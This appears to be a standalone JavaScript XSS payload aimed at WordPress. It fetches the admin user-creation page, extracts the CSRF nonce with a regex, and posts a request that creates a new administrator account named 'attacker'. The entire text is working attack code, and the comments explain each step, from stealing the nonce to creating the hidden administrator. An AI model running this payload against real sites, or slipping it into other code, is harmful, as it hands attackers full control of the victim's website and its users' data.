// Send a GET request to the URL '/wp-admin/user-new.php', and extract the current 'nonce' value
var ajaxRequest = new XMLHttpRequest(); // create Ajax
var requestURL = "/wp-admin/user-new.php";  
var nonceRegex = /ser" value="([^"]*?)"/g; // regex to parse the 'nonce' value
ajaxRequest.open("GET", requestURL, false);  
ajaxRequest.send(); // send Ajax request to get the 'nonce' value
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);  
var nonce = nonceMatch[1]; // store the extracted 'nonce' value, which will be used in a POST request below
  
// Construct a POST query, using the previously extracted 'nonce' value, ann
//	create a new user with an arbitrary username & password, as an Administrator
/* Required parameters for a POST request to add a new user:
	1. _wpnonce_create-user (nonce)
	2. action
	3. user_login (username)
	4. email
	5. pass1 (password)
	6. pass2 (password)
	7. role
*/
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@gmail.com&pass1=attacker&pass2=attacker&role=administrator";  
ajaxRequest = new XMLHttpRequest(); 
ajaxRequest.open("POST", requestURL, true); 
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); 
ajaxRequest.send(params); // send Ajax request to create a new admin user